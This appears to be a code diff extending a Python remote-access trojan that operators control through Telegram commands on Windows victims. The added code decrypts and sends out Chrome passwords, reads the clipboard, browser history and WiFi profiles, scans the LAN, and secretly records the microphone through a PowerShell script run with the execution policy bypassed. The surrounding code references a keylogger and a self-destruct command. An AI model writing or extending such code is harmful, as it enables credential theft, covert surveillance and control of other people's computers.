@@ -341,28 +341,19 @@ def _delete_telegram_message(message_id: str) -> bool:
         return False
 
 def _send_telegram_full_report(cloudflared_url: str) -> bool:
-    """Send or update PC status message on Telegram. One message per PC, edited on reconnect."""
+    """Send PC status message on Telegram. Deletes old message, sends fresh one each time."""
     try:
         state = _load_telegram_state()
-        msg_text = _build_pc_status_text(cloudflared_url, "🟢 Active")
         pc_data = state.get(_PC_ID, {})
-        pc_msg_id = pc_data.get("message_id", "")
+        old_msg_id = pc_data.get("message_id", "")
+        if old_msg_id:
+            _delete_telegram_message(old_msg_id)
 
-        if pc_msg_id:
-            edited = _edit_telegram(pc_msg_id, msg_text)
-            if edited:
-                state[_PC_ID]["last_seen"] = datetime.now().isoformat()
-                state[_PC_ID]["status"] = "active"
-                _save_telegram_state(state)
-                _send_keylog_to_telegram()
-                return True
-            _delete_telegram_message(pc_msg_id)
-
+        msg_text = _build_pc_status_text(cloudflared_url, "\U0001f7e2 Active")
         msg_id = _send_telegram_get_id(msg_text)
         if msg_id:
             state[_PC_ID] = {
                 "message_id": msg_id,
-                "status": "active",
                 "last_seen": datetime.now().isoformat()
             }
             _save_telegram_state(state)
@@ -463,7 +454,23 @@ def _handle_telegram_command(text: str):
             "/reboot - Reboot machine\n"
             "/shutdown - Shutdown machine\n"
             "/panic - Self destruct\n"
-            "/url - Dashboard URL"
+            "/url - Dashboard URL\n"
+            "/chrome - Chrome passwords\n"
+            "/clipboard - Clipboard content\n"
+            "/history - Browser history\n"
+            "/network - Network info + LAN scan\n"
+            "/sysinfo - Detailed system info\n"
+            "/startup - Startup programs\n"
+            "/tasks - Scheduled tasks\n"
+            "/disks - Disk drives\n"
+            "/lock - Lock screen\n"
+            "/logoff - Log off user\n"
+            "/hibernate - Hibernate\n"
+            "/speak <text> - Text to speech\n"
+            "/wallpaper <url> - Change wallpaper\n"
+            "/browser <url> - Open in browser\n"
+            "/status - Quick status\n"
+            "/mic [secs] - Record microphone"
         )
 
     elif cmd == "/info":
@@ -687,23 +694,210 @@ def _handle_telegram_command(text: str):
         except:
             _send_telegram("Notification failed")
 
+    elif cmd == "/chrome":
+        try:
+            passwords = _decrypt_chrome_passwords()
+            if passwords:
+                text = "\n".join(passwords[:30])
+                _send_telegram(f"<b>Chrome Passwords</b>\n<pre>{text[:4000]}</pre>")
+            else:
+                _send_telegram("No Chrome passwords found")
+        except:
+            _send_telegram("Chrome dump failed")
+
+    elif cmd == "/clipboard":
+        try:
+            result = subprocess.run(['powershell', '-Command',
+                'Get-Clipboard'],
+                capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW)
+            clip = result.stdout.strip()[:4000] or '(empty)'
+            _send_telegram(f"<b>Clipboard</b>\n<pre>{clip}</pre>")
+        except:
+            _send_telegram("Clipboard read failed")
+
+    elif cmd == "/history":
+        try:
+            history = _get_browser_history()
+            if history:
+                text = "\n".join(history[:40])
+                _send_telegram(f"<b>Browser History</b>\n<pre>{text[:4000]}</pre>")
+            else:
+                _send_telegram("No browser history found")
+        except:
+            _send_telegram("History dump failed")
+
+    elif cmd == "/network":
+        try:
+            info = _get_network_info()
+            text = f"Type: {info['type'].upper()}\nIP: {info['ip']}\nGateway: {info['gateway']}\n"
+            if info['type'] == 'wifi' and info['wifi_profiles']:
+                text += "\nWiFi Profiles:\n" + "\n".join(info['wifi_profiles'][:20])
+            if info['type'] == 'ethernet' and info['lan_devices']:
+                text += f"\nLAN Devices ({len(info['lan_devices'])}):\n" + "\n".join(info['lan_devices'][:30])
+            _send_telegram(f"<b>Network Info</b>\n<pre>{text[:4000]}</pre>")
+        except:
+            _send_telegram("Network scan failed")
+
+    elif cmd == "/sysinfo":
+        try:
+            result = subprocess.run(['powershell', '-Command',
+                'Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture, TotalVisibleMemorySize, FreePhysicalMemory; Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed; Get-CimInstance Win32_VideoController | Select-Object Name, AdapterRAM; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace | Format-List'],
+                capture_output=True, text=True, timeout=20, creationflags=_NO_WINDOW)
+            _send_telegram(f"<b>System Info</b>\n<pre>{result.stdout.strip()[:4000]}</pre>")
+        except:
+            _send_telegram("System info failed")
+
+    elif cmd == "/startup":
+        try:
+            result = subprocess.run(['powershell', '-Command',
+                'Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Format-List'],
+                capture_output=True, text=True, timeout=15, creationflags=_NO_WINDOW)
+            _send_telegram(f"<b>Startup Programs</b>\n<pre>{result.stdout.strip()[:4000]}</pre>")
+        except:
+            _send_telegram("Startup list failed")
+
+    elif cmd == "/tasks":
+        try:
+            result = subprocess.run(['powershell', '-Command',
+                'Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath | Format-Table -HideTableHeaders'],
+                capture_output=True, text=True, timeout=15, creationflags=_NO_WINDOW)
+            _send_telegram(f"<b>Scheduled Tasks</b>\n<pre>{result.stdout.strip()[:4000]}</pre>")
+        except:
+            _send_telegram("Task list failed")
+
+    elif cmd == "/disks":
+        try:
+            result = subprocess.run(['powershell', '-Command',
+                'Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | Select-Object DeviceID, @{N="SizeGB";E={[math]::Round($_.Size/1GB,1)}}, @{N="FreeGB";E={[math]::Round($_.FreeSpace/1GB,1)}}, FileSystem | Format-Table -AutoSize'],
+                capture_output=True, text=True, timeout=15, creationflags=_NO_WINDOW)
+            _send_telegram(f"<b>Disk Drives</b>\n<pre>{result.stdout.strip()[:4000]}</pre>")
+        except:
+            _send_telegram("Disk list failed")
+
+    elif cmd == "/lock":
+        try:
+            subprocess.run(['rundll32', 'user32.dll,LockWorkStation'], creationflags=_NO_WINDOW)
+            _send_telegram("Screen locked")
+        except:
+            _send_telegram("Lock failed")
+
+    elif cmd == "/logoff":
+        try:
+            _send_telegram("Logging off user...")
+            subprocess.run(['shutdown', '/l'], creationflags=_NO_WINDOW)
+        except:
+            _send_telegram("Logoff failed")
+
+    elif cmd == "/hibernate":
+        try:
+            _send_telegram("Hibernating machine...")
+            subprocess.run(['shutdown', '/h'], creationflags=_NO_WINDOW)
+        except:
+            _send_telegram("Hibernate failed")
+
+    elif cmd == "/speak":
+        if not args:
+            _send_telegram("Usage: /speak <text>")
+            return
+        try:
+            subprocess.run(['powershell', '-Command',
+                f'Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{args.strip()}")'],
+                creationflags=_NO_WINDOW, close_fds=True)
+            _send_telegram(f"Spoken: {args.strip()}")
+        except:
+            _send_telegram("Speak failed")
+
+    elif cmd == "/wallpaper":
+        if not args:
+            _send_telegram("Usage: /wallpaper <url>")
+            return
+        try:
+            img_path = os.path.join(KEYLOG_DIR, "_wp.jpg")
+            resp = requests.get(args.strip(), timeout=30)
+            with open(img_path, 'wb') as f:
+                f.write(resp.content)
+            import ctypes
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 3)
+            _send_telegram("Wallpaper changed")
+        except:
+            _send_telegram("Wallpaper change failed")
+
+    elif cmd == "/browser":
+        if not args:
+            _send_telegram("Usage: /browser <url>")
+            return
+        try:
+            import webbrowser
+            webbrowser.open(args.strip())
+            _send_telegram(f"Opened: {args.strip()}")
+        except:
+            _send_telegram("Browser open failed")
+
+    elif cmd == "/status":
+        try:
+            uptime_sec = int(time.time() - _START_TIME)
+            uptime_str = f"{uptime_sec // 3600}h {uptime_sec % 3600 // 60}m"
+            active_win = subprocess.run(['powershell', '-Command',
+                '(Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object -First 1).MainWindowTitle'],
+                capture_output=True, text=True, timeout=10, creationflags=_NO_WINDOW)
+            ip = requests.get("https://api.ipify.org", timeout=10).text
+            _send_telegram(f"<b>Status</b>\nUptime: {uptime_str}\nIP: {ip}\nActive: {active_win.stdout.strip() or 'N/A'}\nURL: {CLOUDFLARED_PUBLIC_URL}")
+        except:
+            _send_telegram("Status check failed")
+
+    elif cmd == "/mic":
+        duration = 10
+        if args and args.strip().isdigit():
+            duration = min(int(args.strip()), 120)
+        try:
+            mic_path = os.path.join(KEYLOG_DIR, "_tg_mic.wav")
+            ps_script = os.path.join(KEYLOG_DIR, "_rec.ps1")
+            with open(ps_script, 'w') as f:
+                f.write(f'$file = "{mic_path}"\n')
+                f.write('Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class Rec{[DllImport(\\"winmm.dll\\")]public static extern int mciSendString(string a,string b,int c,int d);}"\n')
+                f.write('[Rec]::mciSendString("open new Type waveaudio Alias rec",$null,0,0)\n')
+                f.write('[Rec]::mciSendString("record rec",$null,0,0)\n')
+                f.write(f'Start-Sleep -Seconds {duration}\n')
+                f.write('[Rec]::mciSendString("save rec $file",$null,0,0)\n')
+                f.write('[Rec]::mciSendString("close rec",$null,0,0)\n')
+            subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', ps_script],
+                creationflags=_NO_WINDOW, capture_output=True, timeout=duration + 15)
+            try:
+                os.remove(ps_script)
+            except:
+                pass
+            if os.path.exists(mic_path) and os.path.getsize(mic_path) > 0:
+                _send_telegram_file(mic_path, f"Mic recording ({duration}s)")
+                try:
+                    os.remove(mic_path)
+                except:
+                    pass
+            else:
+                _send_telegram("Mic recording failed - no audio captured")
+        except:
+            _send_telegram("Mic record failed")
+
     else:
         _send_telegram(f"Unknown command: {cmd}\nType /help for commands")
 
 def _telegram_heartbeat(cloudflared_url: str):
-    """Periodically update the Telegram status message with current Last Seen time."""
+    """Periodically delete old status message and send fresh one with current time."""
     global _TELEGRAM_HEARTBEAT_RUNNING
     while _TELEGRAM_HEARTBEAT_RUNNING:
         time.sleep(60)
         try:
             state = _load_telegram_state()
             pc_data = state.get(_PC_ID, {})
-            msg_id = pc_data.get("message_id", "")
-            if not msg_id:
-                continue
-            msg_text = _build_pc_status_text(cloudflared_url, "🟢 Active")
-            if _edit_telegram(msg_id, msg_text):
-                state[_PC_ID]["last_seen"] = datetime.now().isoformat()
+            old_msg_id = pc_data.get("message_id", "")
+            if old_msg_id:
+                _delete_telegram_message(old_msg_id)
+            msg_text = _build_pc_status_text(cloudflared_url, "\U0001f7e2 Active")
+            new_msg_id = _send_telegram_get_id(msg_text)
+            if new_msg_id:
+                state[_PC_ID] = {
+                    "message_id": new_msg_id,
+                    "last_seen": datetime.now().isoformat()
+                }
                 _save_telegram_state(state)
         except:
             pass
